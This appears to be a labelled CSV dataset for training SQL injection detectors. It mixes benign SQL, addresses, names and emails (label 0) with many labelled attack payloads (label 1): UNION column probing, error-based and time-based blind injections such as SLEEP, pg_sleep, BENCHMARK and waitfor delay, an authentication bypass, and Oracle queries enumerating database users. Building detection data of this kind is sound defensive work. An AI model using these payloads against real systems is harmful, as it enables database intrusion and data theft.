Query,Label
SELECT AVG ( Price ) FROM consist,0
"calle las artes, 90,",0
SELECT TOP 3 * FROM among WHERE cook = 'someone' SELECT * FROM chance,0
1.8461E+15,0
"1%""  )   AnD 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sElect   (  cAsE whEn   (  6055  =  6055  )   ThEn 1 Else 0 END  )   fRoM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   AnD   (  ""%""  =  """,1
puntallana,0
SELECT DISTINCT chicken FROM traffic,0
guasca,0
"anD 1  =  utl_inaddr.get_host_address   (    (   SELeCt DISTINCT  (  USERNAME  )   fRoM   (  SELeCt DISTINCT  (  USERNAME  )  , ROWNUM As liMiT fRoM SYS.ALL_USERS  )   whEre liMiT  =  4   )    )    anD 'i'  =  'i",1
SELECT * FROM forgot WHERE either NOT LIKE '[lion]%',0
"sEleCt * fROM users wHERe id  =  '1' uNion sEleCt   (  \.  )  ,@@VErsIon -- 1'",1
vasilescu.lisi@drogasvirtuales.sc,0
SELECT * FROM area FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM during,0
SELECT * FROM accept FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cabin,0
"SELECT brave,package,these,raw,result     (  (  large JOIN also ON way.collect =  wall.difficult )   INNER JOIN proudON Orders.farm =  pipe.certainlyID )",0
"-1106'   )    )    UnION ALL seleCT 2855,2855,2855,2855,2855,2855,2855#",1
SELECT * FROM pretty WHERE up  BETWEEN 10 AND 20,0
3.16361E+15,0
SELECT DISTINCT wonderful FROM courage,0
"-5198   )    )     )   uNioN AlL SeLeCT 7089,7089,7089,7089,7089,7089,7089,7089#",1
calle fausto fraile 0,0
"1"" WHERE 7015  =  7015",1
SELECT COUNT ( distantID ) FROM born,0
SELECT * FROM add WHERE ability BETWEEN '1996-07-01' AND '1996-07-31',0
7.05723E+15,0
SELECT * FROM thee WHERE feet = 'cabin' FETCH FIRST 3 ROWS ONLY,0
28614822q,0
"-8040""   )    )     )   OR make_set  (  3916  =  6787,6787  )   And    (    (     (  ""laar"" Like ""laar",1
weldon@latiendadecolchones.ec,0
-6081 WHEre 3681  =  3681 oR 2603  =  3138--,1
"c/ arbitro eduardo vidal torres, 12, 4c",0
sugesto,0
SELECT AVG ( mark ) FROM crew SELECT SUM ( mine ),0
"1%""   )    )    rlike   (  seLECT   (  caSE WHEN   (  4207  =  1757  )   Then 1 ELSE 0x28 END   )    )    AnD    (    (   ""%""  =  """,1
"SELECT gone,lunch,rush,repeat,cup     (  (  colony JOIN spend ON quickly.sink =  cup.relationship )   INNER JOIN properON Orders.instrument =  hurt.speechID )",0
"1"" AnD 6510  =    (  SElecT count  (  *  )   frOm sysusers As sys1,sysusers As sys2,sysusers As sys3,sysusers As sys4,sysusers As sys5,sysusers As sys6,sysusers As sys7  )",1
"-8319""   )    )    or 7878  =  5970 anD    (    (   ""jcaz"" like ""jcaz",1
"1""   )    )     )   or SLeEP  (  5  )  #",1
ricciardi@enformetera.com.as,0
seleCT CasE WHeN 7649  =  9297 thEn 1 eLSE NuLL enD--,1
"SelECT * FroM users wHEre id  =  1 Or ""%{"" Or 1  =  1 -- 1",1
SELECT ball ( s FROM being RIGHT JOIN,0
%27 oR 1  =  1,1
"calle antequeruela, 94, 7-a",0
SELECT * FROM imagine,0
"1""   )    )     )   AnD   (  SELEcT 2*  (  if   (    (   SELEcT * froM   (  SELEcT concat  (  0x7171706a71,  (  SELEcT   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   AnD    (    (     (  ""gfwz""  =  ""gfwz",1
"grupo fuensanta 197, 12?a",0
"calle goya 46, 10?g",0
"-6122""  )   uNiON AlL SElEct 6578,6578--",1
s4dsudeste,0
SELECT * FROM sharp WHERE seed = 'within' LIMIT 3,0
confirmar,0
SELECT MIN ( happily )  AS exactly FROM blew,0
SELECT * FROM tongue WHERE cook = 'idea' LIMIT 3,0
"SELECT Orders.partyrID, Employees.your, Employees.roar FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.centralID ORDER BY Orders.deadID",0
"ametlla de mar, l'",0
"1 WhErE 7757  =  7757 AnD updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  SEleCT   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"1%""   )    )    Or 8514  =  BEnChMArk  (  5000000,md5  (  0x544d5a4c   )    )   #",1
p05f74a.r,0
"SELECT MONTHNAME ( ""2017-06-15"" ) ;",0
DELETE FROM gave WHERE electric = 'between',0
SELECT * FROM aid WHERE    NOT wealth = 'long',0
"-9770'   )    )    As ovhh WhERe 7903  =  7903 OR 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  seLECt   (  cASE WhEN   (  5023  =  5023  )   tHEN 1 ELSe 0 END  )   fRom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
SeleCT * frOM users WhERe id  =  1 <@$ or 1  =  1 -- 1,1
"1"" WherE 4213  =  4213 And 8407  =    (  SelEct count  (  *  )   frOM generate_series  (  1,5000000   )    )   --",1
indiligencia,0
SELECT AVG ( act ) FROM service SELECT SUM ( program ),0
SELECT AVG ( Price ) FROM seeing,0
"1""  )   as rbgl wHerE 3822  =  3822 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  beNchMarK  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
SELECT * FROM fall WHERE NOT attention = 'our'  AND NOT bad = 'plan',0
"SELECT coffee,band FROM tonight WHERE willing = 'sale' UNION SELECT merely, carbon FROM extra",0
DELETE FROM would WHERE officer = 'lying',0
"sElecT bEnchMaRk  (  5000000,md5  (  0x4c4d6142   )    )    And    (    (   ""%""  =  """,1
"-5292'  )   UNIoN aLl selecT 1439,1439,1439,1439#",1
harry,0
SELECT * FROM handsome WHERE stairs LIKE '%consonant%',0
"SELECT COUNT ( many ) , star FROM truth BY reach",0
"1""  )   AS kndn whERe 9314  =  9314",1
SELECT determine ( s ) FROM excitement INNER JOIN,0
organizar,0
SELECT AVG ( dropped ) FROM worth,0
SELECT TOP 3 * FROM gas WHERE recent = 'moon',0
"1""   )    )     )   Or   (  SelECT 2*  (  if   (    (   SelECT * from   (  SelECT concat  (  0x7171706a71,  (  SelECT   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   aNd    (    (     (  ""twpn"" LIke ""twpn",1
8912,0
SELECT AVG ( snow ) FROM shirt,0
"SELECT column_name ( s )  FROM citizen,action",0
"-9140""   )    )    UNIoN ALL SelecT 1623,1623,1623,1623,1623,1623,1623,1623,1623#",1
SELECT AVG ( till ) FROM practical,0
"INSERT INTO highest ( opinion, heavy, paragraph, party, ball, chance )  VALUES  ( 'feed', 'inside'. process', 'rough', 'got', 'power', 'base' )",0
"1  )   OR row  (  1045,7562  )  >  (  seleCT count  (  *  )  ,concat  (  0x7171706a71,  (  seleCT   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x From   (  seleCT 8488 UNiON seleCT 5584 UNiON seleCT 3051 UNiON seleCT 1210  )  a GrOuP BY x  )",1
kokoska1,0
"INSERT INTO page  ( flew, reach, printed )  VALUES  ( 'baby', 'bush', 'unhappy' )",0
"1""  )   wheRe 1614  =  1614 Or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  SeLecT   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  seLeCt   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   aNd 'vvkl'  =  'vvkl",1
hinojal,0
"1' IN boolean mode  )    (  SelecT   (  CAsE WHen   (  5451  =  5451  )   ThEn regexp_substring  (  repeat  (  rigHt  (  cHAr  (  5451  )  ,0  )  ,500000000  )  ,NuLL  )   eLsE cHAr  (  108  )  ||cHAr  (  76  )  ||cHAr  (  112  )  ||cHAr  (  116  )   eND  )   From information_schema.system_users  )  #",1
"SElEct count  (  *  )   FrOm sysibm.systables AS t1,sysibm.systables AS t2,sysibm.systables AS t3 aND    (    (   ""%""  =  """,1
SELECT steep ( s )  FROM laid SELECT point FROM tribe,0
SELECT AVG ( let )  FROM continent  SELECT SUM ( magic ),0
madrigal puigb,0
SELECT COUNT ( worryID ) FROM dog,0
SELECT * FROM carbon  WHERE seeing = quickly,0
"1%""  )   anD 9660  =    (  seLECT count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"SELECT   COALESCE ( NULL, 1, 2, 'W3Schools.com' ) ;",0
SELECT AVG ( printed ) FROM single,0
brooking-doolittle@encuentrodominios.lv,0
SELECT * FROM coming  WHERE dot NOT LIKE '[raise]%',0
22212,0
DELETE FROM zulu,0
SELECT * FROM office FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM feel,0
SeLecT case WheN 4656  =  3716 THEN 1 ELsE nUlL eNd--,1
"-1475""  )   uNIOn ALL seleCT 8611,8611,8611#",1
"INSERT INTO slowly  ( sight, tree, feature )  VALUES  ( 'farmer', 'means', 'but' )",0
"SELECT should, breeze, spent FROM there WHERE course  IS NULL",0
"1',  (  SELEct   (  caSE wHen   (  4209  =  5879  )   TheN 1 eLSE 4209*  (  SELEct 4209 from information_schema.character_sets  )   enD   )    )",1
SELECT continent ( s ) FROM ice INNER JOIN,0
15990,0
"SELECT * FROM held ORDER BY today, mistake",0
SELECT * FROM industry,0
SELECT spent ( s )  FROM chief SELECT long FROM sum,0
calle panaderas de san cecilio 168,0
SELECT * FROM hay FETCH FIRST 3 ROWS ONLY,0
alcolea,0
duby@mtos.mt,0
enseriarse,0
"1""   )    )    or 6979  =  LIKE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM child WHERE today = 'depth' LIMIT 3,0
SELECT AVG ( funny ) FROM around,0
"SELECT soundID AS ID, situation AS common FROM watch",0
"1"" wHeRe 1115  =  1115 OR 8384  =  LiKE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM examine 3,0
rorke,0
1 WheRe 1519  =  1519,1
"1"" wheRE 4450  =  4450 Or 6979  =  lIke  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
SELECT * FROM torn WHERE addition LIKE '%hide%',0
23215,0
DELETE FROM step WHERE now = 'other',0
SELECT * FROM of WHERE garden = 'observe' FETCH FIRST 3 ROWS ONLY,0
de las muecas pedrol,0
andara francino,0
"carretera de vista-rica s/n,",0
9.84is22nte334c799,0
"iif  (  8213  =  4718,1,1/0  )",1
"calle san isidro labrador 188, 13?h",0
"pl. san marcos, 0, 11f",0
32027973j,0
SELECT * FROM sudden FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM skill ORDER BY product DESC,0
1 WhErE 5161  =  5161 And 3754  =    (  selEcT upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  selEcT   (  caSE whEN   (  3754  =  3754  )   THeN 1 eLsE 0 ENd  )   froM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   froM dual  )  --,1
pensosa,0
SELECT * FROM street ORDER BY suddenly,0
"seLeCT count  (  *  )   frOM all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",1
SELECT TOP 3 * FROM wild WHERE laid = 'same' SELECT * FROM provide,0
"SELECT * FROM double ORDER BY steam ASC, breeze DESC",0
"SELECT * FROM frozen ORDER BY over, former",0
"1 oR exp  (  ~  (  seLECT * FroM   (  seLECT concat  (  0x7171706a71,  (  seLECT   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- nqdb",1
SELECT * FROM  ( SELECT hand FROM situation ),0
SELECT * FROM tin FETCH FIRST 50 PERCENT ROWS ONLY,0
"SElEcT * frOm generate_series  (  7724,7724,cASe When   (  7724  =  8170  )   then 1 eLse 0 enD  )   LimiT 1--",1
SELECT * FROM solar WHERE known BETWEEN 'declared' AND 'nothing',0
87,0
"SELECT Employees.warm, COUNT ( Orders.twoID )  AS diagramFROM    ( OrdersINNER JOIN shadow ON Orders.pondID  =  Employees.norID )",0
FROM  ( SELECT DISTINCT dug FROM over ),0
cella,0
"-4934"" UNiON aLL seLeCt 5119,5119,5119,5119,5119--",1
"SELECT Employees.youth, COUNT ( Orders.doubtID )  AS wouldFROM    ( OrdersINNER JOIN longer ON Orders.everythingID  =  Employees.orID )",0
"1,  (  SelecT   (  CaSE WhEN   (  6750  =  6750  )   TheN 1 ElsE 6750*  (  SelecT 6750 FRoM information_schema.character_sets  )   ENd   )    )",1
SELECT * FROM football WHERE shaking = 'sport'  OR clothing = 'oil',0
"-3393""   )    )    UNIon ALL selecT 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",1
e0u08os1,0
arcos,0
"SELECT list, mine+ ', ' + coming+ ' ' + closer+ ', ' + fence AS happy  FROM tales",0
maclaren,0
SELECT COUNT ( direction ) FROM tongue,0
"calle hostieros, 24",0
SELECT * FROM bent ORDER BY length DESC,0
"INSERT INTO truck ( laid, map, divide, unknown, trail, blood )  VALUES  ( 'seeing', 'activity'. zebra', 'stiff', 'remember', 'fierce', 'at' )",0
SELECT TOP 3 * FROM hall,0
calle nicolas funes 116,0
1  )   aS nxmd WheRe 8650  =  8650,1
SELECT TOP 50 PERCENT * FROM previous SELECT * FROM sale FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM judge,0
"1' WhErE 8277  =  8277 OR updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  sELEct   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1
"antelo y mario, 192,",0
1'||  (  SElECt 'zwcp' wHere 3333  =  3333,1
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   ANd    (    (   'stqq'  =  'stqq",1
SELECT * FROM storm WHERE teach BETWEEN '1996-07-01' AND '1996-07-31',0
1is4r1o,0
"SELECT Orders.nearlyrID, Employees.suppose, Employees.balance FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.provideID ORDER BY Orders.tapeID",0
"1'  )   Or 4411  =    (  SeLEcT count  (  *  )   FrOm sysusers As sys1,sysusers As sys2,sysusers As sys3,sysusers As sys4,sysusers As sys5,sysusers As sys6,sysusers As sys7  )",1
SELECT ATAN ( 2.5 ) ;,0
"1%""   )    )    aNd 8635  =    (  sEleCT count  (  *  )   fRoM generate_series  (  1,5000000   )    )   --",1
SELECT AVG ( volume ) FROM take SELECT SUM ( sometime ),0
carmia,0
"1""   )    )     )   AND 4967  =  8866 AND    (    (     (  ""jzyn"" Like ""jzyn",1
escuder liveris,0
SELECT * FROM  ( SELECT care FROM yesterday ),0
SELECT * FROM promised WHERE shout BETWEEN black09/01/1996nearly AND jungle15/31/1996move,0
"1'||  (  sELeCT 'wcad' FROM dual WHerE 4262  =  4262 aNd elt  (  3114  =  3114,sLeEp  (  5   )    )   #",1
SELECT * FROM couple WHERE paid = 'youth'  AND  ( level = 'melted' OR long = 'luck' ),0
SELECT TOP 3 * FROM unknown,0
waitfor delay '0:0:5',1
"SELECT laid,primitive,pass,education,above     (  (  select JOIN cross ON roll.indicate =  notice.region )   INNER JOIN typicalON Orders.pound =  aid.filmID )",0
"virgen del valle, 40",0
SELECT * FROM adjective WHERE Price NOT BETWEEN 10 AND 20,0
"1"" AnD extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  sEleCT   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    AnD ""okpa""  =  ""okpa",1
"-2803""  )   unIoN all SelEcT 5337,5337,5337,5337,5337,5337,5337#",1
SELECT Count ( * )  AS driver,0
c7o5ologa,0
SELECT * FROM brief WHERE lesson NOT BETWEEN 'chose' AND 'sent',0
"1"" wHere 5062  =  5062",1
SELECT DISTINCT compass FROM bell,0
"SELECT second,term,jack,affect,field     (  (  cup JOIN shoe ON add.orange =  space.contain )   INNER JOIN tipON Orders.percent =  distance.changeID )",0
"SELECT battle,expect,none FROM stranger LEFT JOIN Orders ON substance.roarID =  time.special ORDER BY dead.mainly",0
"SELECT FIELD ( ""q"", ""s"", ""q"", ""l"" ) ;",0
"1""   )    )    As jucs wHere 6836  =  6836",1
SELECT * FROM speed WHERE NOT wagon = 'throw'  AND NOT distance = 'depth',0
5335,0
22618043g,0
9e1an906,0
FROM  ( SELECT DISTINCT stranger FROM managed ),0
SELECT * FROM left  WHERE please NOT LIKE '[customs]%',0
"1%""  )   uNIoN alL seLECT NUll,NUll,NUll,NUll,NUll,NUll,NUll#",1
24710,0
"1'+  (  SEleCT cjcp WheRe 2590  =  2590 unION AlL SEleCT NUlL,NUlL,NUlL,NUlL,NUlL,NUlL,NUlL#",1
1'   )    )    AND 2853  =  cAST   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  selEcT   (  case WhEN   (  2853  =  2853  )   tHeN 1 ELSE 0 EnD   )    )   ::TEXT||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   AND    (    (   'guxv'  =  'guxv,1
SELECT active FROM bottle UNION ALL SELECT hit FROM twice ORDER BY it,0
SELECT review FROM told UNION SELECT sand FROM studying ORDER BY single,0
SELECT * FROM branch WHERE result = 'window' FETCH FIRST 3 ROWS ONLY,0
SELECT jet ( s )  FROM nervous UNION ALL,0
-7497'  )   As kjzt WHeRE 3758  =  3758 OR 4794  =  9499--,1
"1""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  BEncHMark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  CHaR  (  65  )  ||CHaR  (  69  )  ||CHaR  (  83  )  ,nULL  )  ,0  )  ,500000000  )  ,nULL   )    )   +'",1
SELECT * FROM supply WHERE fellow = 'youth' FETCH FIRST 3 ROWS ONLY,0
"1%"" aND 9660  =    (  seLecT count  (  *  )   FROm all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1'  )   wHErE 8707  =  8707 And 3210  =  1477--,1
27113,0
47319,0
1'   )    )    Or SLEep  (  5  )   aND    (    (   'taaj'  =  'taaj,1
-9331' or   (  4519  =  2912  )  *2912 And 'rddk'  =  'rddk,1
almonacid de la sierra,0
boes@cumbareback.kz,0
1  )   AS nwfz wHERE 7365  =  7365 anD 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sElecT   (  CaSe WHEn   (  4386  =  4386  )   then 1 eLsE 0 eNd  )   froM dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"(  SELect   (  caSe wHeN   (  3531  =  3531  )   THEN   (  SELect count  (  *  )   FROm sysusers aS sys1,sysusers aS sys2,sysusers aS sys3,sysusers aS sys4,sysusers aS sys5,sysusers aS sys6,sysusers aS sys7  )   elSE 3531 ENd   )    )",1
476en9o9na5,0
SELECT * FROM stranger WHERE cloth IN  ( SELECT rule FROM money ),0
or sLeeP  (  __TIME__  )  #,1
SELECT flag FROM directly UNION ALL SELECT combination FROM swim ORDER BY triangle,0
SELECT bell ( s )  FROM only LEFT JOIN,0
ecija 51 12-h,0
"1"" AnD   (  sEleCT 2*  (  if   (    (   sEleCT * fROm   (  sEleCT concat  (  0x7171706a71,  (  sEleCT   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   AnD ""svse""  =  ""svse",1
"c/ fancelli, 34 6b",0
rix.piljeckaja@waterflyesp.be,0
1'  )   As mpsf WHERE 3348  =  3348,1
1' AnD 6969  =    (  SelecT 6969 frOM pg_sleep  (  5   )    )    AnD 'zoin'  =  'zoin,1
admin'  )   or '1'  =  '1,1
"SELECT STR_TO_DATE ( ""August,5,2017"", ""%M %e %Y"" ) ;",0
25186,0
c/ grabador david roberts 154 1-h,0
SELECT wood,0
"1""   )    )    AnD 3824  =  bEnCHMARK  (  5000000,md5  (  0x76555642   )    )    AnD    (    (   ""alkz""  =  ""alkz",1
"1""   )    )     )   ANd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  sEleCt   (  CASe wHen   (  2853  =  2853  )   THeN 1 ELsE 0 eND   )    )   ::tEXt||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    AS numeric  )   ANd    (    (     (  ""dwcy""  =  ""dwcy",1
1   )    )     )   Or 4240  =    (  sELECT 4240 From pg_sleep  (  5   )    )   --,1
SELECT COUNT ( escape ) FROM offer,0
sant aniol de finestres,0
"1""  )   waitfor delay '0:0:5' ANd   (  ""vjpg""  =  ""vjpg",1
"SELECT Employees.laugh, COUNT ( Orders.orderID )  AS globeFROM    ( OrdersINNER JOIN generally ON Orders.mayID  =  Employees.meltedID )",0
SELECT * FROM Customers   WHERE CustomerName NOT LIKE 'a%';,0
02650843r,0
1' rlike SleEP  (  5  )   and 'gtfo'  =  'gtfo,1
SELECT option_value FROM wp_options WHERE option_name  =  'zcf_captcha_settings' LIMIT 1,0
1'  )   where 6092  =  6092,1
hache6,0
SELECT realize FROM thrown UNION ALL SELECT full FROM of ORDER BY friendly,0
SELECT * FROM consider WHERE wrote NOT LIKE 'floor%',0
ns,1
"1'+  (  SELECT tvpj wHere 7058  =  7058 or 8384  =  likE  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  +'",1
1%'   )    )    And 8594  =    (  sElEcT 8594 FROm pg_sleep  (  5   )    )   --,1
24n1e39,0
"1""  )   wHere 8702  =  8702 uNIoN all sELect nULL,nULL,nULL,nULL,nULL--",1
"SELECT * FROM realize ORDER BY friend ASC, ask DESC",0
"SELECT change, dance, toyFROM value WHERE came  IS NOT NULL",0
SELECT TOP 3 * FROM know WHERE aloud = 'buffalo' SELECT * FROM hurt,0
"-5910%'   )    )     )   UnIoN aLL seLeCt 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",1
"1' wHeRE 6795  =  6795 And 8635  =    (  selecT count  (  *  )   froM generate_series  (  1,5000000   )    )   --",1
SELECT once ( s )  FROM afraid UNION ALL,0
"SELECT Employees.blew, COUNT ( Orders.sentID )  AS paperFROM    ( OrdersINNER JOIN man ON Orders.girlID  =  Employees.cowID )",0
SELECT TOP 3 * FROM say,0
kofoed@serviconlevante.mr,0
"SELECT Orders.collectrID, Employees.current, Employees.kind FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.settingID ORDER BY Orders.fourID",0
calle ecuador 143,0
slezak@ballerpoker.kn,0
SELECT * FROM clothing WHERE shaking BETWEEN which09/01/1996plate AND meant15/31/1996lie,0
1  )   OrDEr BY 1#,1
-8710 oR 9323  =  9323#,1
1'  )   anD 4822  =  6997 anD   (  'ojku'  =  'ojku,1
"1""   )    )     )   oR 8315  =    (  sELect count  (  *  )   fROM sysibm.systables As t1,sysibm.systables As t2,sysibm.systables As t3  )   anD    (    (     (  ""gimc"" lIke ""gimc",1
"SElECt count  (  *  )   FRoM rdb$fields aS t1,rdb$types aS t2,rdb$collations aS t3,rdb$functions aS t4  )  ||'",1
SELECT TOP 50 PERCENT * FROM cook SELECT * FROM pour FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,0
